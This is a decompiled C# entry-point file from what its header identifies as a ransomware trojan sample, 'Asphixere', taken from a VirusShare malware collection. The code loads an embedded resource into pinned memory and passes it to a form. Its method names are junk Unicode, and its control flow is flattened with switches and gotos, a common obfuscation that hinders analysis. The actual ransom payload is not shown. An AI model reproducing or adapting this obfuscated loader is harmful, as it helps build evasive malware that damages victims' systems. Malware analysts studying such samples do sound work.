// Decompiled with JetBrains decompiler
// Type: Asphixere.Program
// Assembly: Asphixere, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E674F363-54D5-428F-A0DB-A0B1E158EE32
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-6fdf4d4d09c21b951d616432d31fa42aaf60d94a6c2132e9556452851b499003.exe

using Asphixere.Properties;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Asphixere
{
  internal static class Program
  {
    [STAThread]
    private static unsafe void \uF517Ν\u233C䲳篦ቘ쭊\u088C()
    {
      GCHandle gcHandle = GCHandle.Alloc((object) Resources.挎㪱\uE318\uE9DD䨻\uE7F9뎛剃, GCHandleType.Pinned);
label_1:
      try
      {
        Application.Run((Form) new Form1(new UnmanagedMemoryStream((byte*) gcHandle.AddrOfPinnedObject().ToPointer(), (long) Resources.挎㪱\uE318\uE9DD䨻\uE7F9뎛剃.Length)));
        int num1 = 1;
        int num2 = 1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_1;
            case 2:
              goto label_7;
            default:
              switch (num1)
              {
                case 0:
                  goto label_1;
                case 1:
                  goto label_7;
                default:
                  num2 = 2;
                  continue;
              }
          }
        }
      }
      catch (Exception ex)
      {
      }
label_7:
      try
      {
        int num3 = gcHandle.IsAllocated ? 1 : 0;
        int num4 = 1;
        int num5 = 1;
        if (num3 != 0)
          num5 = 3;
        while (true)
        {
          switch (num5)
          {
            case 0:
              goto label_7;
            case 2:
              num4 = 1;
              num5 = 5;
              continue;
            case 3:
              num4 = 2;
              goto default;
            case 4:
label_14:
              gcHandle.Free();
              num5 = 2;
              continue;
            case 6:
              goto label_15;
            default:
              switch (num4)
              {
                case 0:
                  goto label_7;
                case 1:
                  goto label_3;
                case 2:
                  goto label_14;
                default:
                  num5 = 6;
                  continue;
              }
          }
        }
label_15:
        return;
label_3:;
      }
      catch
      {
      }
    }
  }
}
